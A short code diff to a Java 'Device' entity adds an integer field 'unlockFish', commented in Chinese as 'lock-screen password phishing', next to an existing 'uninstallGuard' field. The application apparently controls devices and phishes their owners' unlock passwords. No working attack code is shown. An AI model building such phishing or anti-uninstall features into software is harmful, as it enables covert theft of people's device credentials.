@@ -67,4 +67,6 @@ public class Device extends AppBaseEntity {
     private Integer uninstallGuard;
     
     private String user;
+    //锁屏密码钓鱼
+    private Integer unlockFish;
 }
